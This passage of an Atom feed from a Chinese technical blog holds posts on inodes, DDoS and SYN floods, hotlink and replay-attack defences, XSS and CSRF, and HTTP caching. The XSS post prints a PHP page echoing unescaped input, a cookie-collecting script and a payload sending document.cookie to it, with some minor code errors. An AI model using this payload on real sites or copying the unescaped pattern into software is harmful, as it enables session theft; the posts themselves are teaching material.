    <link href="https://www.doublekai.com/2021/07/30/inode%E9%97%AE%E9%A2%98/"/>
    <id>https://www.doublekai.com/2021/07/30/inode%E9%97%AE%E9%A2%98/</id>
    <published>2021-07-30T02:56:59.000Z</published>
    <updated>2021-08-02T08:14:03.761Z</updated>
    
    <content type="html"><![CDATA[<h3 id="inode"><a href="#inode" class="headerlink" title="inode"></a>inode</h3><p>理解inode，要从文件储存说起。<br>文件储存在硬盘上，硬盘的最小存储单位叫做”扇区”（Sector）。每个扇区储存512字节（相当于0.5KB）。<br>操作系统读取硬盘的时候，不会一个个扇区地读取，这样效率太低，而是一次性连续读取多个扇区，即一次性读取一个”块”（block）。这种由多个扇区组成的”块”，是文件存取的最小单位。”块”的大小，最常见的是4KB，即连续八个 sector组成一个 block。<br>文件数据都储存在”块”中，那么很显然，我们还必须找到一个地方储存文件的元信息，比如文件的创建者、文件的创建日期、文件的大小等等。这种储存文件元信息的区域就叫做inode，中文译名为”索引节点”。<br>每一个文件都有对应的inode，里面包含了与该文件有关的一些信息。</p><h5 id="inode内容"><a href="#inode内容" class="headerlink" title="inode内容"></a>inode内容</h5><ul><li><p>文件的字节数</p></li><li><p>文件拥有者的User ID</p></li><li><p>  文件的Group ID</p></li><li><p>文件的读、写、执行权限</p></li><li><p>文件的时间戳，共有三个：ctime指inode上一次变动的时间，mtime指文件内容上一次变动的时间，atime指文件上一次打开的时间。</p></li><li><p>链接数，即有多少文件名指向这个inode</p></li></ul><p>查看可以用<code>stat</code>命令<br><img src="/images/inode1.png"></p><h5 id="inode的大小"><a href="#inode的大小" class="headerlink" title="inode的大小"></a>inode的大小</h5><p>inode也会消耗硬盘空间，所以硬盘格式化的时候，操作系统自动将硬盘分成两个区域。一个是数据区，存放文件数据；另一个是inode区（inode table），存放inode所包含的信息。</p><p>每个inode节点的大小，一般是128字节或256字节。inode节点的总数，在格式化时就给定，一般是每1KB或每2KB就设置一个inode。假定在一块1GB的硬盘中，每个inode节点的大小为128字节，每1KB就设置一个inode，那么inode table的大小就会达到128MB，占整块硬盘的12.8%。</p><p>查看每个硬盘分区的inode总数和已经使用的数量，可以使用<code>df -i</code>命令。</p><p><img src="/images/inode2.png"><br>由于每个文件都必须有一个inode，因此有可能发生inode已经用光，但是硬盘还未存满的情况。这时，就无法在硬盘上创建新文件。</p><h5 id="inode号码"><a href="#inode号码" class="headerlink" title="inode号码"></a>inode号码</h5><p>每个inode都有一个号码，操作系统用inode号码来识别不同的文件。</p><p>这里值得重复一遍，Unix/Linux系统内部不使用文件名，而使用inode号码来识别文件。对于系统来说，文件名只是inode号码便于识别的别称或者绰号。</p><p>表面上，用户通过文件名，打开文件。实际上，系统内部这个过程分成三步：首先，系统找到这个文件名对应的inode号码；其次，通过inode号码，获取inode信息；最后，根据inode信息，找到文件数据所在的block，读出数据。</p><p>使用<code>ls -i</code>命令，可以看到文件名对应的inode号码：<br><img src="/images/inode3.png"><br>#####硬链接<br>一般情况下，文件名和inode号码是”一一对应”关系，每个inode号码对应一个文件名。但是，Unix/Linux系统允许，多个文件名指向同一个inode号码。</p><p>这意味着，可以用不同的文件名访问同样的内容；对文件内容进行修改，会影响到所有文件名；但是，删除一个文件名，不影响另一个文件名的访问。这种情况就被称为”硬链接”（hard link）。</p><p><code>ln</code>命令可以创建硬链接：<br><img src="/images/inode4.png"><br>运行上面这条命令以后，源文件与目标文件的inode号码相同，都指向同一个inode。inode信息中有一项叫做”链接数”，记录指向该inode的文件名总数，这时就会增加1。</p><p>反过来，删除一个文件名，就会使得inode节点中的”链接数”减1。当这个值减到0，表明没有文件名指向这个inode，系统就会回收这个inode号码，以及其所对应block区域。</p><p>这里顺便说一下目录文件的”链接数”。创建目录时，默认会生成两个目录项：”.“和”…”。前者的inode号码就是当前目录的inode号码，等同于当前目录的”硬链接”；后者的inode号码就是当前目录的父目录的inode号码，等同于父目录的”硬链接”。所以，任何一个目录的”硬链接”总数，总是等于2加上它的子目录总数（含隐藏目录）。</p><h5 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h5><p>除了硬链接以外，还有一种特殊情况。</p><p>文件A和文件B的inode号码虽然不一样，但是文件A的内容是文件B的路径。读取文件A时，系统会自动将访问者导向文件B。因此，无论打开哪一个文件，最终读取的都是文件B。这时，文件A就称为文件B的”软链接”（soft link）或者”符号链接（symbolic link）。</p><p>这意味着，文件A依赖于文件B而存在，如果删除了文件B，打开文件A就会报错：“No such file or directory”。这是软链接与硬链接最大的不同：文件A指向文件B的文件名，而不是文件B的inode号码，文件B的inode”链接数”不会因此发生变化。</p><p><code>ln -s</code>命令可以创建软链接：<img src="/images/inode5.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;inode&quot;&gt;&lt;a href=&quot;#inode&quot; class=&quot;headerlink&quot; title=&quot;inode&quot;&gt;&lt;/a&gt;inode&lt;/h3&gt;&lt;p&gt;理解inode，要从文件储存说起。&lt;br&gt;文件储存在硬盘上，硬盘的最小存储单位叫做”扇区”（Sector）。每个扇区</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>DDOS攻击和防御</title>
    <link href="https://www.doublekai.com/2021/07/28/DDOS%E6%94%BB%E5%87%BB%E5%92%8C%E9%98%B2%E5%BE%A1/"/>
    <id>https://www.doublekai.com/2021/07/28/DDOS%E6%94%BB%E5%87%BB%E5%92%8C%E9%98%B2%E5%BE%A1/</id>
    <published>2021-07-28T03:00:40.000Z</published>
    <updated>2021-07-29T09:20:59.995Z</updated>
    
    <content type="html"><![CDATA[<h3 id="DDOS攻击"><a href="#DDOS攻击" class="headerlink" title="DDOS攻击"></a>DDOS攻击</h3><p>dos：denial of service（停止服务），DDOS攻击就可以理解为让你的服务器停止服务。<br>而DDOS是一种攻击类型它里面有很多种攻击方式，在网络中遵循着OSI的分层的模式，而DDOS攻击分为应用层攻击和传输层攻击，简单来说就是应用层攻击Http，传输层攻击TCP。</p><h5 id="HTTP攻击"><a href="#HTTP攻击" class="headerlink" title="HTTP攻击"></a>HTTP攻击</h5><p>Http攻击就是从大量的计算机中同时访问服务器，模拟用户请求头来一直访问服务端从而导致服务器拒绝服务。<br>黑客是从哪来得到这么多真实计算机呢？通过资料我了解到国外很多平台，每个平台大约有2w多人注册，相当于2w多计算机，而攻击网站的价钱也只需要几美元就能完成，而这2w人被称为肉鸡，当黑客使用平台攻击网站时，本来网站正在处理正常请求，忽然进来很多正常请求，服务器处理不过来就会导致拒绝服务，从而达到黑客目的。</p><h5 id="SYN攻击"><a href="#SYN攻击" class="headerlink" title="SYN攻击"></a>SYN攻击</h5><p>在TCP/IP协议中，TCP协议提供可靠的连接服务，采用三次握手建立一个连接。<br>第一次握手：建立连接时，客户端发送syn包(syn=j)到服务器，并进入SYN_SEND状态，等待服务器确认；<br>第二次握手：服务器收到syn包，必须确认客户的SYN（ack=j+1），同时自己也发送一个SYN包（syn=k），即SYN+ACK包，此时服务器进入SYN_RECV状态；<br>第三次握手：客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK(ack=k+1)，此包发送完毕，客户端和服务器进入ESTABLISHED状态，完成三次握手。<br>完成三次握手，客户端与服务器开始传送数据，在上述过程中，还有一些重要的概念：<br>未连接队列：在三次握手协议中，服务器维护一个未连接队列，该队列为每个客户端的SYN包（syn=j）开设一个条目，该条目表明 服务器已收到SYN包，并向客户发出确认，正在等待客户的确认包。这些条目所标识的连接在服务器处于Syn_RECV状态，当服务器收到客户的确认包时，删除该条目，服务器进入ESTABLISHED状态。 backlog参数：表示未连接队列的最大容纳数目。<br>SYN-ACK 重传次数　服务器发送完SYN－ACK包，如果未收到客户确认包，服务器进行首次重传，等待一段时间仍未收到客户确认包，进行第二次重传，如果重传次数超过系统规定的最大重传次数，系统将该连接信息从半连接队列中删除。注意，每次重传等待的时间不一定相同。<br>半连接存活时间：是指半连接队列的条目存活的最长时间，也即服务从收到SYN包到确认这个报文无效的最长时间，该时间值是所有重传请求包的最长等待时间总和。有时我们也称半连接存活时间为Timeout时间、SYN_RECV存活时间。<br>SYN攻击利用TCP协议缺陷，通过发送大量的半连接请求，耗费CPU和内存资源。SYN攻击除了能影响主机外，还可以危害路由器、防火墙等网络系统，事实上SYN攻击并不管目标是什么系统，只要这些系统打开TCP服务就可以实施。从上图可看到，服务器接收到连接请求（syn=j），将此信息加入未连接队列，并发送请求包给客户（syn=k,ack=j+1），此时进入SYN_RECV状态。当服务器未收到客户端的确认包时，重发请求包，一直到超时，才将此条目从未连接队列删除。配合IP欺骗，SYN攻击能达到很好的效果，通常，客户端在短时间内伪造大量不存在的IP地址，向服务器不断地发送syn包，服务器回复确认包，并等待客户的确认，由于源地址是不存在的，服务器需要不断的重发直至超时，这些伪造的SYN包将长时间占用未连接队列，正常的SYN请求被丢弃，目标系统运行缓慢，严重者引起网络堵塞甚至系统瘫痪。 三、SYN攻击工具<br>SYN攻击实现起来非常的简单，互联网上有大量现成的SYN攻击工具。</p><h5 id="SYN攻击防范技术"><a href="#SYN攻击防范技术" class="headerlink" title="SYN攻击防范技术"></a>SYN攻击防范技术</h5><p>归纳起来，主要有两大类，一类是通过防火墙、路由器等过滤网关防护，另一类是通过加固TCP/IP协议栈防范.但必须清楚的是，SYN攻击不能完全被阻止，我们所做的是尽可能的减轻SYN攻击的危害，除非将TCP协议重新设计。</p><h5 id="总结使用CDN"><a href="#总结使用CDN" class="headerlink" title="总结使用CDN"></a>总结使用CDN</h5><p>CDN 指的是网站的静态内容分发到多个服务器，用户就近访问，提高速度。因此，CDN 也是带宽扩容的一种方法，可以用来防御 DDOS 攻击。<br>网站内容存放在源服务器，CDN 上面是内容的缓存。用户只允许访问 CDN，如果内容不在 CDN 上，CDN 再向源服务器发出请求。这样的话，只要 CDN 够大，就可以抵御很大的攻击。不过，这种方法有一个前提，网站的大部分内容必须可以静态缓存。对于动态内容为主的网站（比如论坛），就要想别的办法，尽量减少用户对动态数据的请求。<br>上一节提到的镜像服务器，本质就是自己搭建一个微型 CDN。各大云服务商提供的高防 IP，背后也是这样做的：网站域名指向高防 IP，它提供一个缓冲层，清洗流量，并对源服务器的内容进行缓存。当然黑客也可以绕过CDN直接攻击你的服务器，如果直接攻击源服务器，我买了弹性 IP ，可以动态挂载主机实例，受到攻击就换一个地址。大的企业就直接花钱买一些DDos防护产品。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;DDOS攻击&quot;&gt;&lt;a href=&quot;#DDOS攻击&quot; class=&quot;headerlink&quot; title=&quot;DDOS攻击&quot;&gt;&lt;/a&gt;DDOS攻击&lt;/h3&gt;&lt;p&gt;dos：denial of service（停止服务），DDOS攻击就可以理解为让你的服务器停止服务。&lt;br</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>防盗链与重放攻击</title>
    <link href="https://www.doublekai.com/2021/07/22/%E9%98%B2%E7%9B%97%E9%93%BE%E4%B8%8E%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB/"/>
    <id>https://www.doublekai.com/2021/07/22/%E9%98%B2%E7%9B%97%E9%93%BE%E4%B8%8E%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB/</id>
    <published>2021-07-22T01:52:54.000Z</published>
    <updated>2021-07-22T08:46:26.918Z</updated>
    
    <content type="html"><![CDATA[<h3 id="防盗链"><a href="#防盗链" class="headerlink" title="防盗链"></a>防盗链</h3><p>背景：防止别人引用自己服务器上的图片或文件，以致增加服务器流量与压力。<br>看下面两张图片第一张是用户头像第二张是该论坛的<br><img src="https://i3.autoimg.cn/userscenter/g30/M05/03/AB/120X120_0_q87_autohomecar__ChsEoF8ellKAaQNvAAFG7HUCKjc738.JPG" alt="汽车之家"><br><img src="https://club2.autoimg.cn/album/g24/M04/F7/FF/userphotos/2021/06/08/18/820_Chtk3WC_RKOAAcvlAAeCNyXAZF0326.jpg" alt="汽车之家"><br>看一下请求<br><img src="/images/403.jpg"><br>可以看到给我们返回异常请求，接下来我们把referer请求参数改成该论坛主页<br><img src="/images/200.png"><br>成功返回！<br>当然如果你想做的更安全，你可以向一些加密数据一样来个动态token！或者强制登录，这样你的网站不能匿名访问会让用户感到不友好，所以用的最多的防盗链就是判定访问来源是否是在白名单里，如果是则返回。</p><h3 id="重放攻击"><a href="#重放攻击" class="headerlink" title="重放攻击"></a>重放攻击</h3><p>百度解释：重放攻击（Replay Attacks）又称重播攻击、回放攻击或新鲜性攻击（Freshness Attacks），是指攻击者发送一个目的主机已接收过的包，来达到欺骗系统的目的，主要用于身份认证过程，破坏认证的正确性。 它是一种攻击类型，这种攻击会不断恶意或欺诈性地重复一个有效的数据传输，重放攻击可以由发起者，也可以由拦截并重发该数据的敌方进行。攻击者利用网络监听或者其他方式盗取认证凭据，之后再把它重新发给认证服务器。从这个解释上理解，加密可以有效防止会话劫持，但是却防止不了重放攻击。重放攻击任何网络通讯过程中都可能发生。重放攻击是计算机世界黑客常用的攻击方式之一，它的书面定义对不了解密码学的人来说比较抽象。<br>大致意思就是用户发一个包访问服务器，被黑客拦截到，然后黑客利用这个包一直访问服务器。<br>如果网站没有防御，基本上都能破解，利用暴力破解登录该服务器（只是时间和运气）总有一天能破解</p><h5 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h5><p>不重复请求方式，意思就是让每次请求都有动态改变参数<br>一级：<br>进入登陆页面时，生成一个随机码（称之为盐值），在客户端页面和session中各保存一份。<br>客户端提交登录请求时，将md5之后的密码与该随机码拼接后，再次执行md5，然后提交（提交的密码=md5(md5(密码明文)+随机码)）。<br>后端接收到登录请求后，将从数据库中查询出的密码与session中的随机码拼接后，md5运算，然后与前端传递的结果进行比较。<br>黑客可以解析js将加密方式获取出来。<br>二级：<br>考虑到密码输入的方便性，好多用户的密码都设置的很短，并且不够复杂，往往是6位数字字母组合，这样的密码md5之后保存到数据库，一旦数据库数据泄露，简单密码的md5结果很容易通过暴力破解的方式给解密出来，何况md5出现了这么多年，可能已经有不少字典了！同时为了方便用户登录的方便性，我们的系统一般不可能要求用户设置很长、很复杂的密码！怎么办？加固定盐值。<br>系统设置一个固定的盐值，该盐值最好足够复杂，如:1qaz2wsx3edc4rfv!@#$%^&amp;qqtrtRTWDFHAJBFHAGFUAHKJFHAJHFJHAJWRFA<br>用户注册、修改密码时，将用户的原始密码与我们的固定盐值拼接，然后做md5运算。<br>传递至后端，保存进数据库（数据库中保存的密码是用户的原始密码拼接固定盐值后，md5运算后的结果）。<br>登录时，将用户的原始密码与我们的固定盐值进行拼接，然后做md5运算，运算后的结果再拼接上我们的随机码，再次md5运算，然后提交。<br>后端接收到登录请求后，将从数据库中查询出的密码与session中的随机码拼接后，md5运算，然后与前端传递的结果进行比较。<br>三级：<br>加登录验证码，可预防人为地暴力登录破解<br>账户锁定，如果用户密码输入错误次数达到一定量后（如6次），则可以锁定该账号（不过该方法应该会被很多用户不满意，现在设置的密码越来越多，总要用户一个个试吧！）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;防盗链&quot;&gt;&lt;a href=&quot;#防盗链&quot; class=&quot;headerlink&quot; title=&quot;防盗链&quot;&gt;&lt;/a&gt;防盗链&lt;/h3&gt;&lt;p&gt;背景：防止别人引用自己服务器上的图片或文件，以致增加服务器流量与压力。&lt;br&gt;看下面两张图片第一张是用户头像第二张是该论坛的&lt;br&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Web网站中的XSS攻击和CSRF攻击</title>
    <link href="https://www.doublekai.com/2021/07/19/%E6%B7%B1%E6%8C%96XSS-%E5%92%8CCSRF/"/>
    <id>https://www.doublekai.com/2021/07/19/%E6%B7%B1%E6%8C%96XSS-%E5%92%8CCSRF/</id>
    <published>2021-07-19T01:19:13.000Z</published>
    <updated>2021-07-19T07:55:18.124Z</updated>
    
    <content type="html"><![CDATA[<h3 id="CSRF：跨站点请求伪造"><a href="#CSRF：跨站点请求伪造" class="headerlink" title="CSRF：跨站点请求伪造"></a>CSRF：跨站点请求伪造</h3><p>你可以这么理解，黑客写了一个网站，在后端写了一串代码 功能是“给我女朋友发消息说我们分手了”。你当时正在网页跟女友聊天，右下角出现一个美女广告你想关闭不小心点了进去，发现跳转到一个网页，然后你关闭了。晚上你在登陆网页跟女友聊天发现她把你拉黑了。</p><blockquote><p> 简单理解就是，黑客利用你的cookie信息给服务器发送恶意请求，从而达到他的目的。</p></blockquote><h3 id="如何防御CSRF攻击"><a href="#如何防御CSRF攻击" class="headerlink" title="如何防御CSRF攻击"></a>如何防御CSRF攻击</h3><p>目前防御 CSRF 攻击主要有三种策略：验证 HTTP Referer 字段；在请求地址中添加 token 并验证；在 HTTP 头中自定义属性并验证。</p><h5 id="1-验证-HTTP-Referer-字段"><a href="#1-验证-HTTP-Referer-字段" class="headerlink" title="1. 验证 HTTP Referer 字段"></a>1. 验证 HTTP Referer 字段</h5><p><img src="/images/re.jpg" alt="请求头中的Referer"><br>根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。如果黑客恶意请求必须在自己的服务器运行，而他这边的Referer跟你请求的不一致，就会被服务器退回，认为是CSRF攻击<br>这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。<br>而有些浏览器可以手动修改Referer的值从而达到CSRF攻击目的</p><h5 id="2-在请求地址中添加-token-并验证"><a href="#2-在请求地址中添加-token-并验证" class="headerlink" title="2. 在请求地址中添加 token 并验证"></a>2. 在请求地址中添加 token 并验证</h5><p>CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。<br>该方法还有一个缺点是难以保证 token 本身的安全。黑客可以在自己的网站上得到这个 token，并马上就可以发动 CSRF 攻击。为了避免这一点，系统可以在添加 token 的时候增加一个判断，如果这个链接是链到自己本站的，就在后面添加 token，如果是通向外网则不加。不过，即使这个 csrftoken 不以参数的形式附加在请求之中，黑客的网站也同样可以通过 Referer 来得到这个 token 值以发动 CSRF 攻击。这也是一些用户喜欢手动关闭浏览器 Referer 功能的原因。</p><h5 id="3-在-HTTP-头中自定义属性并验证"><a href="#3-在-HTTP-头中自定义属性并验证" class="headerlink" title="3. 在 HTTP 头中自定义属性并验证"></a>3. 在 HTTP 头中自定义属性并验证</h5><p><img src="/images/token.png" alt="请求头中的Token"><br>这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去<br>然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于 Ajax 方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行 CSRF 防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。</p><h3 id="XSS：跨站脚本攻击"><a href="#XSS：跨站脚本攻击" class="headerlink" title="XSS：跨站脚本攻击"></a>XSS：跨站脚本攻击</h3><p>小A刚刚学习php写了一个购物网站，为了凸显他的网站牛逼写了一个登录才能访问商品页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;小A的购物网站&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;form&gt;</span><br><span class="line">             &lt;input type=&quot;text&quot; name=&quot;address&quot; value=&quot;&lt;?php echo $_GET[&#x27;address&#x27;];?&gt;&quot;/&gt;</span><br><span class="line">             &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>某天小A向女友炫耀自己网站，要女友登录查看，女友当时看了一下源代码顿时惊出冷汗！。告诉小A他这个请求直接把用户通过GET发送过来的表单数据，未经过处理直接写入返回的html流，小A一脸懵逼没懂，随后女友在自己服务器写了一个脚本xss_hacker.php：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$victim = &#x27;小A网站的 cookie:&#x27;.$_SERVER[&#x27;REMOTE_ADDR&#x27;].&#x27;:&#x27;.$_GET[&#x27;cookie&#x27;];</span><br><span class="line">fill_put_contents(&#x27;user.txt&#x27;,$victim);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>然后到小A网站的表单中提交这么一段字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/&gt;&lt;script&gt;window.open(&quot;http://localhost/xss_hacker.php?cookie=&quot;+document.cookie);&lt;/script&gt;&lt;!--</span><br></pre></td></tr></table></figure><p>此时小A看到自己的网页代码变成了这样,顿时茅塞顿开，立马上网给女友买了一支口红表示感谢。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;小A的购物网站&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;form&gt;</span><br><span class="line">             &lt;input type=&quot;text&quot; name=&quot;address&quot; value=&quot;&quot;/&gt;&lt;script&gt;window.open(&quot;http://localhost/xss_hacker.php?cookie=&quot;+document.cookie);&lt;/script&gt;&lt;!--&quot;/&gt;</span><br><span class="line">             &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上述案例就是XSS攻击（非持久型）。</p><script>alert("这就是非持久型XSS攻击")</script><p>存储型XSS（持久型）<br>存储型XSS也被称为持久型XSS（persistent XSS），这种类型的XSS攻击更常见，危害也更大。它和反射型XSS类似，不过会把攻击代码存储到数据库中，任何用户访问包含攻击代码的页面都会被殃及。</p><p>比如，某个网站通过表单接收用户的留言，如果服务器接收数据后未经处理就存储到数据库中，那么用户可以在留言中出入任意javaScript代码。比如攻击者在留言中加入一行重定向代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.location.href=”http://localhost”;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>其他任意用户一旦访问关于这条留言的页面，包含这条留言的数据就会被浏览器解析，就会执行其中的javaScript脚本。那么这个用户所在页面就会被重定向到攻击者写入的站点。<br>XSS的预防可以从多方面着手：</p><ol><li>浏览器自身就可以识别简单的XSS攻击字符串，从而阻止简单的XSS攻击；</li><li>从根本上说，解决办法是消除网站的XSS漏洞，这就需要网站开发者运用转义安全符等手段；</li></ol><p>很多网站都是直接把&lt; &gt; 等字符过滤掉比如：<br><img src="/images/xss.png" alt="汽车之家的搜索"><br><img src="/images/xs2.png" alt="汽车之家的搜索"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;CSRF：跨站点请求伪造&quot;&gt;&lt;a href=&quot;#CSRF：跨站点请求伪造&quot; class=&quot;headerlink&quot; title=&quot;CSRF：跨站点请求伪造&quot;&gt;&lt;/a&gt;CSRF：跨站点请求伪造&lt;/h3&gt;&lt;p&gt;你可以这么理解，黑客写了一个网站，在后端写了一串代码 功能是</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>响应体里的强缓存和协商缓存</title>
    <link href="https://www.doublekai.com/2021/07/12/%E5%93%8D%E5%BA%94%E4%BD%93%E9%87%8C%E7%9A%84%E5%BC%BA%E7%BC%93%E5%AD%98%E5%92%8C%E5%8D%8F%E5%95%86%E7%BC%93%E5%AD%98/"/>
    <id>https://www.doublekai.com/2021/07/12/%E5%93%8D%E5%BA%94%E4%BD%93%E9%87%8C%E7%9A%84%E5%BC%BA%E7%BC%93%E5%AD%98%E5%92%8C%E5%8D%8F%E5%95%86%E7%BC%93%E5%AD%98/</id>
    <published>2021-07-12T01:16:20.000Z</published>
    <updated>2021-07-13T06:18:49.878Z</updated>
    
    <content type="html"><![CDATA[<h3 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h3><p>缓存无处不在！有浏览器端的缓存， 有服务器端的缓存，有代理服务器的缓存， 有ASP.NET页面缓存，对象缓存。 数据库也有缓存， 等等。<br>缓存的目的：访问速度更快，减少服务器的负担，重复数据不用来来回回的访问</p><h3 id="浏览器的强缓存"><a href="#浏览器的强缓存" class="headerlink" title="浏览器的强缓存"></a>浏览器的强缓存</h3><p>在我们请求网站的时候，一般第一次比较慢，第二次较快，但是当你F5刷新时又跟第一次一样，<br><img src="/images/qiang.jpg" alt="强缓存的响应头"><br>max-age 表示缓存的时间是31536000秒（一年），后面还有两个参数一个 public｜private｜immutable<br>public：客户端和代理服务器都可以缓存该资源；<br>客户端在xxx秒的有效期内，如果有请求该资源的需求的话就直接读取缓存,statu code:200 ，如果用户做了刷新操作，就向服务器发起http请求<br>private：只让客户端可以缓存该资源；代理服务器不缓存<br>客户端在xxx秒内直接读取缓存,statu code:200<br>immutable：客户端在xxx秒的有效期内，如果有请求该资源的需求的话就直接读取缓存,statu code:200 ，即使用户做了刷新操作，也不向服务器发起http请求<br>还有两个参数<br>cache-control: no-cache<br>跳过设置强缓存，但是不妨碍设置协商缓存；一般如果你做了强缓存，只有在强缓存失效了才走协商缓存的，设置了no-cache就不会走强缓存了，每次请求都回询问服务端。</p><p>cache-control: no-store<br>不缓存，这个会让客户端、服务器都不缓存，也就没有所谓的强缓存、协商缓存了。</p><h3 id="协商缓存"><a href="#协商缓存" class="headerlink" title="协商缓存"></a>协商缓存</h3><p>当我们知道网站缓存会有大大提高用户的访问速度等，但是如果用户本地在访问网站时在本地存下缓存，下一次访问会直接在本地不访问服务器，这一段时间正好网站更新了某了东西导致版本不一致怎么办？而这时候去请求服务器的这过程就可以设置协商缓存。这时候，协商缓存就是需要客户端和服务器两端进行交互的。<br><img src="/images/xie.png" alt="协商缓存缓存的响应头"><br>etag：一个hash编码也就是文件等编码一个文件一个不重复<br>last-modified：文件的修改时间，精确到秒<br>也就是说，每次请求返回来 response header 中的 etag和 last-modified，在下次请求时在 request header 就把这两个带上，服务端把你带过来的标识进行对比，然后判断资源是否更改了，如果更改就直接返回新的资源，和更新对应的response header的标识etag、last-modified。如果资源没有变，那就不变etag、last-modified，这时候对客户端来说，每次请求都是要进行协商缓存了，即：</p><p>发请求–&gt;看资源是否过期–&gt;过期–&gt;请求服务器–&gt;服务器对比资源是否真的过期–&gt;没过期–&gt;返回304状态码–&gt;客户端用缓存的老资源。<br>所以协商缓存步骤总结：<br>请求资源时，把用户本地该资源的 etag 同时带到服务端，服务端和最新资源做对比。<br>如果资源没更改，返回304，浏览器读取本地缓存。<br>如果资源有更改，返回200，返回最新的资源。</p><h3 id="设置强缓存与协商缓存"><a href="#设置强缓存与协商缓存" class="headerlink" title="设置强缓存与协商缓存"></a>设置强缓存与协商缓存</h3><p>在服务器上的Header增加强缓存或协商缓存字段<br>如nodejs:<br>res.setHeader(‘max-age’: ‘3600 public’) //强缓存<br>res.setHeader(etag: ‘5c20abbd-e2e8’) //协商缓存<br>res.setHeader(‘last-modified’: Mon, 24 Dec 2018 09:49:49 GMT)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;缓存&quot;&gt;&lt;a href=&quot;#缓存&quot; class=&quot;headerlink&quot; title=&quot;缓存&quot;&gt;&lt;/a&gt;缓存&lt;/h3&gt;&lt;p&gt;缓存无处不在！有浏览器端的缓存， 有服务器端的缓存，有代理服务器的缓存， 有ASP.NET页面缓存，对象缓存。 数据库也有缓存， 等等。&lt;b</summary>
      
    
    
    
    
